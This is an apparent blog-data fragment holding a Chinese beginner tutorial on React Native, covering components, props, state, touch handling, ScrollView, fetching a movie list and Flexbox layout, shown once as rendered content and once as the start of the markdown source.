{item.releaseYear}</Text>}\n          keyExtractor={(item, index) => item.id}\n        />\n      </View>\n    );\n  }\n}\n```\n\n> 从 Android9 开始，也会默认阻止 http 请求，请参考[相关配置](https://blog.csdn.net/qq_40347548/article/details/86766932)\n\n> 默认情况下，iOS 会阻止所有 http 的请求，以督促开发者使用 https。如果你仍然需要使用 http 协议，那么首先需要添加一个 App Transport Security 的例外，详细可参考[这篇帖子](https://segmentfault.com/a/1190000002933776)。\n\n### 使用其他的网络库\n\nReact Native 中已经内置了[XMLHttpRequest API](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest)(也就是俗称的 ajax)。一些基于 XMLHttpRequest 封装的第三方库也可以使用，例如[frisbee](https://github.com/niftylettuce/frisbee)或是[axios](https://github.com/mzabriskie/axios)等。但注意不能使用 jQuery。\n\n> 在应用中你可以访问任何网站，没有[跨域](http://en.wikipedia.org/wiki/Cross-origin_resource_sharing)的限制。\n\n## 电影列表\n\n> 在一个`FlatList`中展示出电影列表。\n\n### 准备工作\n\n使用`cli`工具创建一个工程：\n\n```bash\nreact-native init SampleAppMovies\n```\n\n这条命令除了会下载`js`文件，还会下载在`SampleAppMovies/iOS/SampleAppMovies.xcodeproj`和`SampleAppMovies/android/app`下分别创建一个新的 XCode 工程(iOS)和一个 gradle 工程(Android)。\n\n### 开发\n\n`Android`版本：先连接设备或启动模拟器，然后在`SampleAppMovies`目录下运行`react-native run-android`，就会构建工程。\n\n#### 电影列表\n\n<img src=\"/movielist.gif\" alt=\"movielist\" style=\"zoom:50%;\" />\n\n```js\nimport React, { useState, Component } from 'react';\nimport { View, Text, Button, Alert, Platform, Image, ScrollView, TextInput, FlatList, SectionList, ActivityIndicator, StyleSheet, TouchableHighlight, TouchableOpacity, TouchableNativeFeedback, TouchableWithoutFeedback } from 'react-native';\n\n// 原 url\nconst REQUEST_URL =  \"https://raw.githubusercontent.com/facebook/react-native/0.51-stable/docs/MoviesExample.json\";\n\nclass App extends Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      data: [],\n      loaded: false\n    };\n    this.fetchData = this.fetchData.bind(this);\n  }\n  // 请求数据\n  fetchData() {\n    let data = require('./test/moivelist.json')\n    // 通过定时器 模拟ajax\n    setTimeout(() => {\n      this.setState({\n        data: data.movies,\n        loaded: true\n      });\n    }, 3000)\n    // 真正请求的ajax\n    // fetch(REQUEST_URL)\n    //   .then((response) => response.json())\n    //   .then((responseData) => {\n    //     // 注意，这里使用了this关键字，为了保证this在调用时仍然指向当前组件，我们需要对其进行“绑定”操作\n    //     this.setState({\n    //       movies: responseData.movies,\n    //     });\n    //   });\n  }\n  // 在生命周期中调用接口\n  componentDidMount() {\n    this.fetchData();\n  }\n  render(){\n    if (!this.state.loaded) {\n      return this.renderLoadingView();\n    }\n    return (\n      <FlatList\n      data={this.state.data}\n      renderItem={this.renderMovie}\n      style={styles.list}\n      keyExtractor={item => item.id}\n    />\n    );\n  }\n  // 加载动画\n  renderLoadingView() {\n    return (\n      <View style={styles.container}>\n        <Text>\n          正在加载电影数据……\n        </Text>\n      </View>\n    );\n  }\n  // 渲染列表\n  renderMovie({ item }) {\n    // { item }是一种“解构”写法，请阅读ES2015语法的相关文档\n    // item也是FlatList中固定的参数名，请阅读FlatList的相关文档\n    return (\n      <View style={styles.container}>\n        <Image\n          source={{uri: item.posters.thumbnail}}\n          style={styles.thumbnail}\n        />\n        <View style={styles.rightContainer}>\n          <Text style={styles.title}>{item.title}</Text>\n          <Text style={styles.year}>{item.year}</Text>\n        </View>\n      </View>\n    );\n  }\n}\n\nconst styles = StyleSheet.create({\n  list: {\n    paddingTop: 20,\n    backgroundColor: '#F5FCFF',\n  },\n  container: {\n    flex: 1,\n    flexDirection: 'row',\n    justifyContent: 'center',\n    alignItems: 'center',\n    backgroundColor: '#F5FCFF',\n  },\n  rightContainer: {\n    flex: 1,\n  },\n  title: {\n    fontSize: 20,\n    marginBottom: 8,\n    textAlign: 'center',\n  },\n  year: {\n    textAlign: 'center',\n  },\n  thumbnail: {\n    width: 53,\n    height: 81\n  }\n});\n\nexport default App;\n```\n\n# 设计\n\n## RN中的样式\n\n所有的核心组件都接受名为`style`的属性。这些样式名基本上是遵循了 web 上的 CSS 的命名，只是按照 JS 的语法要求使用了驼峰命名法，例如将`background-color`改为`backgroundColor`。\n\n+ `style`属性可以是一个普通的 JavaScript 对象\n\n+ 使用`StyleSheet.create`来集中定义组件的样式。\n\n```jsx\nimport React, { Component } from 'react';\nimport { StyleSheet, Text, View } from 'react-native';\n\nexport default class LotsOfStyles extends Component {\n  render() {\n    return (\n      <View>\n        <Text style={styles.red}>just red</Text>\n        <Text style={styles.bigBlue}>just bigBlue</Text>\n        <Text style={[styles.bigBlue, styles.red]}>bigBlue, then red</Text>\n        <Text style={[styles.red, styles.bigBlue]}>red, then bigBlue</Text>\n      </View>\n    );\n  }\n}\n\nconst styles = StyleSheet.create({\n  bigBlue: {\n    color: 'blue',\n    fontWeight: 'bold',\n    fontSize: 30,\n  },\n  red: {\n    color: 'red',\n  },\n});\n```\n\n## 高度与宽度\n\n组件的高度和宽度决定了其在屏幕上显示的尺寸。\n\n### 指定宽高\n\n样式中指定固定的`width`和`height`。React Native 中的尺寸都是无单位的，表示的是与设备像素密度无关的逻辑像素点。\n\n```jsx\nimport React, { Component } from 'react';\nimport { View } from 'react-native';\n\nexport default class FixedDimensionsBasics extends Component {\n  render() {\n    return (\n      <View>\n        <View style={{width: 50, height: 50, backgroundColor: 'powderblue'}} />\n        <View style={{width: 100, height: 100, backgroundColor: 'skyblue'}} />\n        <View style={{width: 150, height: 150, backgroundColor: 'steelblue'}} />\n      </View>\n    );\n  }\n}\n```\n\n这样给组件设置尺寸也是一种常见的模式，比如要求在不同尺寸的屏幕上都显示成一样的大小。\n\n<img src=\"/image-20200326151335084.png\" alt=\"image-20200326151335084\" style=\"zoom:50%;\" />\n\n**注意：此时没法适配多种屏幕大小**\n\n### 弹性（Flex）宽高\n\n在组件样式中使用`flex`可以使其在可利用的空间中动态地扩张或收缩。一般而言我们会使用`flex:1`来指定某个组件扩张以撑满所有剩余的空间。如果有多个并列的子组件使用了`flex:1`，则这些子组件会平分父容器中剩余的空间。如果这些并列的子组件的`flex`值不一样，则谁的值更大，谁占据剩余空间的比例就更大（即占据剩余空间的比等于并列组件间`flex`值的比）。\n\n```jsx\nconst App = () => {\n  return (\n    <View style={styles.father}>\n      <View style={styles.son1} />\n      <View style={styles.son2} />\n      <View style={styles.son3} />\n    </View>\n  )\n}\n// 去掉父View中的`flex: 1`。  ----- View不再具有尺寸，因此子组件也无法再撑开。\n// 然后再用`height: 300`来代替父View的`flex: 1` ---- 父View的高度变成300\nconst styles = StyleSheet.create({\n  father: {\n    flex: 1,\n    // flexDirection: \"row\", // 改变子元素的伸缩方向\n  },\n  son1: {\n    flex: 1,\n    backgroundColor: 'powderblue'\n  },\n  son2: {\n    flex: 2, \n    backgroundColor: 'skyblue'\n  },\n  son3: {\n    flex: 3,\n    backgroundColor: 'steelblue'\n  },\n});\n```\n\n<img src=\"/image-20200326151248022.png\" alt=\"image-20200326151248022\" style=\"zoom:50%;\" />\n\n## 使用Flexbox布局\n\nFlexbox 可以在不同屏幕尺寸上提供一致的布局结构。\n\n使用`flexDirection`、`alignItems`和 `justifyContent`三个样式属性就已经能满足大多数布局需求。\n\n> React Native 中的 Flexbox 的工作原理和 web 上的 CSS 基本一致，当然也存在少许差异。首先是默认值不同：`flexDirection`的默认值是`column`而不是`row`，而`flex`也只能指定一个数字值。\n\n### Flex\n\n如上\n\n### Flex Direction\n\n`flexDirection`可以决定布局的**主轴**。**水平轴(`row`)**方向，竖直轴(`column`)**方向。默认值是**竖直轴(`column`)方向。\n\n```jsx\n\nclass App extends Component {\n  render() {\n    return (\n      // 尝试把`flexDirection`改为`column`看看\n      <View style={{flex: 1, flexDirection: 'row'}}>\n        <View style={{width: 50, height: 50, backgroundColor: 'powderblue'}} />\n        <View style={{width: 50, height: 50, backgroundColor: 'skyblue'}} />\n        <View style={{width: 50, height: 50, backgroundColor: 'steelblue'}} />\n      </View>\n    );\n  }\n}\n\n```\n\n<img src=\"/image-20200326154915534.png\" alt=\"image-20200326154915534\" style=\"zoom:50%;\" />\n\n### 布局方向\n\n**LTR：文本和子项，从左到右排列**\n\n布局方向指定层次结构中子级和文本的布局方向。 布局方向也会影响边的起点和终点。\n\n 默认情况下，React Native使用LTR布局方向进行布局。 在此模式下，开始是指左，结束是指右。\n\nLTR（默认值）文本和子项，从左到右排列。 元素的开始处应用的边距和填充在左侧。\n\nRTL文本和子级，从右到左排列。 应用于元素开始的边距和填充在右侧。\n\n### Justify Content\n\n```jsx\nclass App extends Component {\n  render() {\n    return (\n      // 尝试把`justifyContent`改为`center`看看\n      // 尝试把`flexDirection`改为`row`看看\n      <View style={{\n        flex: 1,\n        flexDirection: 'column', // 默认纵向布局\n        justifyContent: 'space-between',\n      }}>\n        <View style={{width: 100, height: 100, backgroundColor: 'powderblue'}} />\n        <View style={{width: 100, height: 100, backgroundColor: 'skyblue'}} />\n        <View style={{width: 100, height: 100, backgroundColor: 'steelblue'}} />\n      </View>\n    );\n  }\n}\n```\n\n<img src=\"/image-20200326155234896.png\" alt=\"image-20200326155234896\" style=\"zoom:50%;\" />\n\n### Align Items\n\n```jsx\nclass App extends Component {\n  render() {\n    return (\n      // 尝试把`alignItems`改为`flex-start`看看\n      // 尝试把`justifyContent`改为`flex-end`看看\n      // 尝试把`flexDirection`改为`row`看看\n      <View style={{\n        flex: 1,\n        flexDirection: 'column',\n        justifyContent: 'center',\n        alignItems: 'stretch',\n      }}>\n        <View style={{width: 50, height: 50, backgroundColor: 'powderblue'}} />\n        <View style={{height: 50, backgroundColor: 'skyblue'}} />\n        <View style={{height: 100, backgroundColor: 'steelblue'}} />\n      </View>\n    );\n  }\n}\n```\n\n<img src=\"/image-20200326155524158.png\" alt=\"image-20200326155524158\" style=\"zoom:50%;\" />\n\n### Align Self\n\nalignSelf具有与alignItems相同的选项和效果，但是不影响容器中的子元素，您可以将此属性应用于单个子元素，以更改其在其父元素中的对齐方式。alignSelf用alignItems覆盖父类设置的任何选项。\n\n```jsx\nclass App extends Component {\n  render() {\n    return (\n      <View style={{\n        flex: 1,\n        flexDirection: 'column',\n        justifyContent: 'center',\n        alignItems: 'stretch',\n      }}>\n        <View style={{height: 100, backgroundColor: 'powderblue'}} >\n          <Text style={{alignSelf: 'flex-end',weight: 50, height: 50, backgroundColor: 'red'}} >子内容</Text>\n        </View>\n        <View style={{height: 50, backgroundColor: 'skyblue'}} />\n        <View style={{height: 100, backgroundColor: 'steelblue'}} />\n      </View>\n    );\n  }\n}\n\n```\n\n**alignSelf: `flex-start|flex-end|center|stretch`**\n\n<img src=\"/image-20200326160914205.png\" alt=\"image-20200326160914205\" style=\"zoom:50%;\" />\n\n### Align Content\n\nalignContent定义沿横轴的线分布。 仅当使用flexWrap将项目包装到多行时，此功能才有效。\n\n+ `flex-start`（默认值）将换行对齐到容器横轴的起点。\n+ `flex-end`将换行对齐到容器横轴的末端。\n+ `stretch` 包装线以匹配容器横轴的高度。\n+ `center`将包装线对齐到容器横轴的中心。\n+ `space-between`在容器的主轴上均匀间隔的线，在线之间分配剩余空间。\n+ `space-around`在容器的主轴上均匀间隔地包裹线，在线周围分配剩余空间。 与使用空格之间的空间相比，周围的空间将导致空间分配到第一行的开头和最后一行的末尾。\n+ `space-evenly` 沿主轴均匀地分布在对齐容器内。 每对相邻项之间的间距，主开始边缘和第一个项目以及主结束边缘和最后一个项目都完全相同。\n\n<img src=\"/image-20200331154557560.png\" alt=\"image-20200331154557560\" style=\"zoom:67%;\" />\n\n### Flex Wrap\n\nflexWrap属性在容器上设置，并控制当子原生沿主轴溢出容器大小时发生的情况。 默认情况下，子级被强制为一行（可以收缩元素）。 如果允许包装，则根据需要将项目沿主轴包装成多行。\n\n换行时，可以使用alignContent指定行在容器中的放置方式。\n\n<img src=\"/image-20200331154722643.png\" alt=\"image-20200331154722643\" style=\"zoom:50%;\" />\n\n### Flex Basis, Grow, and Shrink\n\n+ flexGrow描述如何沿主轴在容器的子级之间分配容器中的任何空间。 布置好其子项后，容器将根据其子项指定的伸缩增长值分配所有剩余空间。\n  + flexGrow接受任何大于等于0的浮点值，其中0为默认值。 容器将在孩子之间分配剩余空间，该剩余空间将根据孩子的弹性增长值来加权。\n\n+ flexShrink描述了在子项的总大小溢出主轴上容器大小的情况下如何沿主轴收缩子项。 Flex收缩与Flex增长非常相似，如果任何溢出大小都被视为负剩余空间，则可以用相同的方式来考虑。 通过允许孩子根据需要生长和收缩，这两个属性也可以很好地协同工作。\n  + Flex收缩接受任何大于等于0的浮点值，默认值为1。 容器将根据其子项的flex收缩值对子项进行收缩。\n\n+ flexBasis是一种与轴无关的方式，用于沿主轴提供项目的默认大小。 如果子项的父级是具有flexDirection：row的容器，则设置子项的flex基础类似于设置子项的宽度；如果子项的父级是具有flexDirection：列的容器，则设置子项的高度。 项目的伸缩基础是该项目的默认大小，即执行任何伸缩增长和伸缩收缩计算之前的项目大小。\n\n### 宽度和高度\n\nYoga中的width属性指定元素内容区域的宽度。 同样，height属性指定元素内容区域的高度。\n\n宽度和高度都可以采用以下值：\n\n+ auto是默认值，React Native根据元素的内容（无论是其他子元素，文本还是图像）计算元素的宽度/高度。\n\n+ pixel定义宽度/高度，以绝对像素为单位。 根据组件上设置的其他样式，这可能是节点的最终尺寸，也可能不是。\n\n+ percent定义宽度或高度，以其父级宽度或高度的百分比表示。\n\n### 绝对和相对布局\n\n元素的位置类型定义了元素在其父元素中的位置。\n\n相对（默认值）默认情况下，元素是相对放置的。 这意味着元素将根据布局的正常流程进行定位，然后根据上，右，下和左的值相对于该位置偏移。 偏移量不会影响任何同级元素或父元素的位置。\n\n绝对当绝对定位时，元素不参与正常的布局流程。 相反，它的布局与兄弟姐妹无关。 根据顶部，右侧，底部和左侧的值确定位置。\n\n<img src=\"/image-20200331155044160.png\" alt=\"image-20200331155044160\" style=\"zoom:50%;\" />\n","source":"_posts/RN基础入门.md","raw":"---\ntitle: RN基础入门\ncategories:\n  - ReactNative\ntags:\n  - ReactNative\nabbrlink: e61ae078\ndate: 2020-03-31 16:14:14\n---\n\n# 入门基础\n\n## 核心组件和原生组件\n\n### 原生组件\n\n使用React Native，您可以使用React组件通过JavaScript调用Android 和IOS视图。 在运行时，React Native为这些组件创建相应的Android和iOS视图。 由于React Native组件具有与Android和iOS相同的视图支持，因此React Native应用的外观，感觉和性能与其他任何应用一样。 我们将这些平台支持的组件称为“本机组件”。\n\n通过React Native，您可以为Android和iOS构建自己的Native Components，以满足您应用的独特需求。 我们还有一个由社区贡献的组成部分的繁荣生态系统。 查看本机目录以查找社区正在创建的内容。\n\nReact Native还包括一组基本的，随时可用的Native组件，您可以使用它们立即开始构建您的应用程序。 这些是React Native的核心组件。\n\n### 核心组件\n\nReact Native具有许多核心组件，从表单控件到活动指示器，应有尽有。 您可以在API部分找到所有记录的文档。 您将主要使用以下核心组件：\n\n| RN UI 组件     | ANDROID VIEW   | IOS VIEW         | WEB ANALOG               | 说明                                                    |\n| :------------- | :------------- | :--------------- | :----------------------- | :------------------------------------------------------ |\n| `<View>`       | `<ViewGroup>`  | `<UIView>`       | A non-scrollling `<div>` | 支持flexbox布局、样式、一些触摸处理和可访问性控制的容器 |\n| `<Text>`       | `<TextView>`   | `<UITextView>`   | `<p>`                    | 显示，设置样式和嵌套文本字符串，甚至处理触摸事件        |\n| `<Image>`      | `<ImageView>`  | `<UIImageView>`  | `<img>`                  | 显示不同类型的图像                                      |\n| `<ScrollView>` | `<ScrollView>` | `<UIScrollView>` | `<div>`                  | 通用滚动容器，可以包含多个组件和视图                    |\n| `<TextInput>`  | `<EditText>`   | `<UITextField>`  | `<input type=\"text\">`    | 允许用户输入文字                                        |\n\n```jsx\nimport React, { useState } from 'react';\nimport { View, Text, Image, ScrollView, TextInput, FlatList } from 'react-native';\n\nconst App = () => {\n  return (\n    <ScrollView>\n      <Text>Some text</Text>\n      <View>\n        <Text>Some moqqqre text</Text>\n        <Image source={{uri: 'bd'}} style={{width: 200, height: 200}}></Image>\n        <Image source={require('./1.png')} style={{width: 200, height: 200, borderColor: 'gray',  borderWidth: 1}}/>\n        <Image source={{uri: \"https://facebook.github.io/react-native/docs/assets/p_cat2.png\"}} style={{width: 200, height: 200}}/>\n      </View>\n      <TextInput\n        style={{\n          height: 40,\n          borderColor: 'gray',\n          borderWidth: 1\n        }}\n        defaultValue=\"You can type in me\"\n      />\n    </ScrollView>\n  )\n}\n\nexport default App;\n\n```\n\n## React基础\n\n### 组件\n\n#### Function Component\n\n ```jsx\nimport React from 'react';\nimport { Text } from 'react-native';\nexport default function Cat() {\n  return (\n    <Text>Hello, I am your cat!</Text>\n  );\n}\n ```\n\n#### Class Component\n\n```jsx\nimport React, { Component } from 'react';\nimport { Text } from 'react-native';\nexport default class Cat extends Component {\n  render() {\n    return (\n      <Text>Hello, I am your cat!</Text>\n    );\n  }\n}\n```\n\n这两种不同的组件之间的**本质区别就是**：有无state属性 和 生命周期函数！\n\n### JSX\n\n```jsx\nimport React from 'react';\nimport { Text } from 'react-native';\nexport default function Cat() {\n  function getFullName(firstName, secondName, thirdName) {\n    return firstName + \" \" + secondName + \" \" + thirdName;\n  }\n  return (\n    <Text>\n      Hello, I am {getFullName(\"Rum\", \"Tum\", \"Tugger\")}!\n    </Text>\n  );\n}\n```\n\n### 自定义组件\n\n```jsx\nimport React, { Component } from \"react\";\nimport { Button, Text, View } from \"react-native\";\nexport class Cat extends Component {\n  state = { isHungry: true };\n  render(props) {\n    return (\n      <View>\n        <Text>\n          I am {this.props.name}, and I am\n          {this.state.isHungry ? \" hungry\" : \" full\"}!\n        </Text>\n        <Button\n          onPress={() => {\n            this.setState({ isHungry: false });\n          }}\n          disabled={!this.state.isHungry}\n          title={\n            this.state.isHungry ? \"Pour me some milk, please!\" : \"Thank you!\"\n          }\n        />\n      </View>\n    );\n  }\n}\nexport default class Cafe extends Component {\n  render() {\n    return (\n      <>\n        <Cat name=\"Munkustrap\" />\n        <Cat name=\"Spot\" />\n      </>\n    );\n  }\n}\n```\n\n### props\n\n**类似于vue的父子组件传值**\n\n```jsx\nimport React from 'react';\nimport { Text, View } from 'react-native';\nfunction Cat(props) {\n  return (\n    <View>\n      <Text>Hello, I am {props.name}!</Text>\n    </View>\n  );\n}\nexport default function Cafe() {\n  return (\n    <View>\n      <Cat name=\"Maru\" />\n      <Cat name=\"Jellylorum\" />\n      <Cat name=\"Spot\" />\n    </View>\n  );\n}\n```\n\n### state\n\n**类似于vue data对象**\n\n`useState `：\n\n`[<getter>, <setter>] = useState(<initialValue>)`。\n\n在函数组件中调用`useState`，就会创建一个单独的状态。\n\n在类组件中，`state` 总是一个对象，可以在该对象上添加保存属性。\n\n每次调用`useState`都会创建一个`state`块，其中包含一个值。\n\n```jsx\nimport React, { useState } from \"react\";\nimport { Button, Text, View } from \"react-native\";\nfunction Cat(props) {\n  // 创建一个状态，并将其初始化为“true”\n  const [isHungry, setIsHungry] = useState(true);\n  return (\n    <View>\n      <Text>\n        I am {props.name}, and I am {isHungry ? \"hungry\" : \"full\"}!\n      </Text>\n      <Button\n        onPress={() => {\n          setIsHungry(false);\n        }}\n        disabled={!isHungry}\n        title={isHungry ? \"Pour me some milk, please!\" : \"Thank you!\"}\n      />\n    </View>\n  );\n}\nexport default function Cafe() {\n  return (\n    <>\n      <Cat name=\"Munkustrap\" />\n      <Cat name=\"Spot\" />\n    </>\n  );\n}\n```\n\n```jsx\nimport React, { Component } from \"react\";\nimport { Button, Text, View } from \"react-native\";\nexport class Cat extends Component {\n  // 声明状态\n  state = { isHungry: true };\n  render(props) {\n    return (\n      <View>\n        <Text>\n          I am {this.props.name}, and I am\n          {this.state.isHungry ? \" hungry\" : \" full\"}!\n        </Text>\n        <Button\n          onPress={() => {\n            {/* 通过 setState 改变状态 */}\n            this.setState({ isHungry: false });\n          }}\n          disabled={!this.state.isHungry}\n          title={\n            this.state.isHungry ? \"Pour me some milk, please!\" : \"Thank you!\"\n          }\n        />\n      </View>\n    );\n  }\n}\nexport default class Cafe extends Component {\n  render() {\n    return (\n      <>\n        <Cat name=\"Munkustrap\" />\n        <Cat name=\"Spot\" />\n      </>\n    );\n  }\n}\n```\n\n## RN的Props\n\n### 原生组件的props\n\n以常见的基础组件`Image`为例，在创建一个图片时，可以传入一个名为`source`的 prop 来指定要显示的图片的地址，以及使用名为`style`的 prop 来控制其尺寸。\n\n```jsx\nimport React, { Component } from 'react';\nimport { Image } from 'react-native';\n\nexport default class Bananas extends Component {\n  render() {\n    let pic = {\n      uri: 'https://upload.wikimedia.org/wikipedia/commons/d/de/Bananavarieties.jpg'\n    };\n    return (\n      <Image source={pic} style={{width: 193, height: 110}} />\n    );\n  }\n}\n```\n\n### 自定义组件\n\n```jsx\nimport React, { Component } from 'react';\nimport { Text, View } from 'react-native';\n\nclass Greeting extends Component {\n  render() {\n    return (\n      <View style={{alignItems: 'center', marginTop: 50}}>\n        {/* Greeting组件中将name作为一个属性来定制 */}\n        <Text>Hello {this.props.name}!</Text>\n      </View>\n    );\n  }\n}\n\nexport default class LotsOfGreetings extends Component {\n  render() {\n    return (\n      <View style={{alignItems: 'center'}}>\n        <Greeting name='Rexxar' />\n        <Greeting name='Jaina' />\n        <Greeting name='Valeera' />\n      </View>\n    );\n  }\n}\n```\n\n## RN中的State\n\n一般来说，你需要在class中声明一个`state`对象，然后在需要修改时调用`setState`方法。\n\n假如我们需要制作一段不停闪烁的文字。文字内容本身在组件创建时就已经指定好了，所以文字内容应该是一个`prop`。而文字的显示或隐藏的状态（快速的显隐切换就产生了闪烁的效果）则是随着时间变化的，因此这一状态应该写到`state`中。\n\n```jsx\nimport React, { Component } from 'react';\nimport { Text, View } from 'react-native';\n\nclass Blink extends Component {\n  // 声明state对象\n  state = { isShowingText: true };\n  \n  componentDidMount() {\n    // 每1000毫秒对showText状态做一次取反操作\n    setInterval(() => {\n      this.setState({\n        isShowingText: !this.state.isShowingText\n      });\n    }, 1000);\n  }\n\n  render() {\n    // 根据当前showText的值决定是否显示text内容\n    if (!this.state.isShowingText) {\n      return null;\n    }\n\n    return (\n      <Text>{this.props.text}</Text>\n    );\n  }\n}\n\nexport default class BlinkApp extends Component {\n  render() {\n    return (\n      <View>\n        <Blink text='I love to blink' />\n        <Blink text='Yes blinking is so great' />\n        <Blink text='Why did they ever take this out of HTML' />\n        <Blink text='Look at me look at me look at me' />\n      </View>\n    );\n  }\n}\n```\n\n实际开发中，==我们一般不会在定时器函数（setInterval、setTimeout 等）中来操作 state==。典型的场景是在接收到服务器返回的新数据，或者在用户输入数据之后。你也可以使用一些“状态容器”比如[Redux](http://redux.js.org/index.html)来统一管理数据流。\n\n- 一切界面变化都是`状态state变化`\n- `state`的修改必须通过`setState()`方法\n  - this.state.likes = 100; // 这样的`直接赋值修改无效！`\n  - setState 是一个 merge 合并操作，只修改指定属性，不影响其他属性\n  - setState 是`异步`操作，修改`不会马上生效`\n\n## 处理文本输入\n\n[`TextInput`](https://reactnative.cn/docs/textinput#content)是一个允许用户输入文本的基础组件。\n\n它有一个名为`onChangeText`的属性，此属性接受一个函数，而此函数会在文本变化时被调用。\n\n另外还有一个名为`onSubmitEditing`的属性，会在文本被提交后（用户按下软键盘上的提交键）调用。\n\n```jsx\n /** 处理文本输入\n \t每输入一个单词就得到一块 🍕 */\nfunction PizzaTranslator() {\n  const [text, setText] = useState('');\n  return (\n    <View style={{padding: 10}}>\n      <TextInput\n        style={{height: 40, backgroundColor: '#ccc'}}\n        placeholder=\"Type here to translate!\"\n        onChangeText={text => setText(text)}\n        defaultValue={text}\n      />\n      <Text style={{padding: 10, fontSize: 42}}>\n        {text.split(' ').map((word) => word && '🍕').join(' ')}\n      </Text>\n    </View>\n  );\n}\n```\n\n<img src=\"/image-20200327083821128.png\" alt=\"image-20200327083821128\" style=\"zoom:50%;\" />\n\n## 处理触摸事件\n\n### onPress 事件\n\n```jsx\n<Button\n  onPress={() => {\n    Alert.alert(\"你点击了按钮！\");\n  }}\n  title=\"点我！\"\n/>\n```\n\n<img src=\"/image-20200327084507790.png\" alt=\"image-20200327084507790\" style=\"zoom:50%;\" />\n\n```jsx\nclass App extends Component {\n  _onPressButton() {\n    Alert.alert('You tapped the button!')\n  }\n  render() {\n    const styles = StyleSheet.create({\n      container: {\n        flex: 1,\n        justifyContent: 'center',\n      },\n      buttonContainer: {\n        margin: 20\n      },\n      alternativeLayoutButtonContainer: {\n        margin: 20,\n        flexDirection: 'row',\n        justifyContent: 'space-between'\n      }\n    })\n    return (\n      <View style={styles.container}>\n        <View style={styles.buttonContainer}>\n          <Button\n            onPress={this._onPressButton}\n            title=\"Press Me\"\n          />\n        </View>\n        <View style={styles.buttonContainer}>\n          <Button\n            onPress={this._onPressButton}\n            title=\"Press Me\"\n            color=\"#841584\"\n          />\n        </View>\n        <View style={styles.alternativeLayoutButtonContainer}>\n          <Button\n            onPress={this._onPressButton}\n            title=\"This looks great!\"\n          />\n          <Button\n            onPress={this._onPressButton}\n            title=\"OK!\"\n            color=\"#841584\"\n          />\n        </View>\n      </View>\n    );\n  }\n}\n```\n\n<img src=\"/image-20200327085101363.png\" alt=\"image-20200327085101363\" style=\"zoom:50%;\" />\n\n### Touchable 系列组件\n\n- 一般来说，你可以使用[**TouchableHighlight**](https://reactnative.cn/docs/touchablehighlight)来制作按钮或者链接。注意此组件的背景会在用户手指按下时变暗。\n- 在 Android 上还可以使用[**TouchableNativeFeedback**](https://reactnative.cn/docs/touchablenativefeedback)，它会在用户手指按下时形成类似墨水涟漪的视觉效果。\n- [**TouchableOpacity**](https://reactnative.cn/docs/touchableopacity)会在用户手指按下时降低按钮的透明度，而不会改变背景的颜色。\n- 如果你想在处理点击事件的同时不显示任何视觉反馈，则需要使用[**TouchableWithoutFeedback**](https://reactnative.cn/docs/touchablewithoutfeedback)。\n\n+ 检测用户是否进行了长按，组件中使用`onLongPress`属性来实现。\n\n```jsx\nimport React, { Component } from 'react';\nimport { Alert, Platform, StyleSheet, Text, TouchableHighlight, TouchableOpacity, TouchableNativeFeedback, TouchableWithoutFeedback, View } from 'react-native';\n\nclass App extends Component {\n  _onPressButton() {\n    Alert.alert('You tapped the button!')\n  }\n\n  _onLongPressButton() {\n    Alert.alert('You long-pressed the button!')\n  }\n  render() {\n    const styles = StyleSheet.create({\n      container: {\n        paddingTop: 60,\n        alignItems: 'center'\n      },\n      button: {\n        marginBottom: 30,\n        width: 260,\n        alignItems: 'center',\n        backgroundColor: '#2196F3'\n      },\n      buttonText: {\n        textAlign: 'center',\n        padding: 20,\n        fontSize: 16,\n        color: '#fff'\n      }\n    })\n    return (\n      <View style={styles.container}>\n        {/* 组件的背景会在用户手指按下时变暗。 */}\n        <TouchableHighlight onPress={this._onPressButton} underlayColor=\"white\">\n          <View style={styles.button}>\n            <Text style={styles.buttonText}>TouchableHighlight</Text>\n          </View>\n        </TouchableHighlight>\n        {/* 用户手指按下时降低按钮的透明度，而不会改变背景的颜色。 */}\n        <TouchableOpacity onPress={this._onPressButton}>\n          <View style={styles.button}>\n            <Text style={styles.buttonText}>TouchableOpacity</Text>\n          </View>\n        </TouchableOpacity>\n        {/* Android 用户手指按下时形成类似墨水涟漪的视觉效果。 */}\n        <TouchableNativeFeedback\n            onPress={this._onPressButton}\n            background={Platform.OS === 'android' ? TouchableNativeFeedback.SelectableBackground() : ''}>\n          <View style={styles.button}>\n            <Text style={styles.buttonText}>TouchableNativeFeedback</Text>\n          </View>\n        </TouchableNativeFeedback>\n        {/* 不显示任何视觉反馈 */}\n        <TouchableWithoutFeedback\n            onPress={this._onPressButton}\n            >\n          <View style={styles.button}>\n            <Text style={styles.buttonText}>TouchableWithoutFeedback</Text>\n          </View>\n        </TouchableWithoutFeedback>\n        {/* 绑定单击 和 长按事件 */}\n        <TouchableHighlight onPress={this._onPressButton} onLongPress={this._onLongPressButton} underlayColor=\"white\">\n          <View style={styles.button}>\n            <Text style={styles.buttonText}>Touchable with Long Press</Text>\n          </View>\n        </TouchableHighlight>\n      </View>\n    );\n  }\n}\n```\n\n## 滚动视图\n\n[`ScrollView`](https://reactnative.cn/docs/scrollview)是一个通用的可滚动的容器，你可以在其中放入多个组件和视图，而且这些组件并不需要是同类型的。ScrollView 不仅可以垂直滚动，还能水平滚动（通过`horizontal`属性来设置）。\n\n下面的示例代码创建了一个垂直滚动的`ScrollView`，其中还混杂了图片和文字组件。\n\n<img src=\"/ScrollView.gif\" alt=\"ScrollView\" style=\"zoom:50%;\" />\n\n```jsx\nclass App extends Component {\n  render() {\n    return (\n      <ScrollView style={{backgroundColor: '#df02d0'}}>\n        <Text style={{fontSize:48}}>Scroll me plz</Text>\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Text style={{fontSize:48}}>If you like</Text>\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} 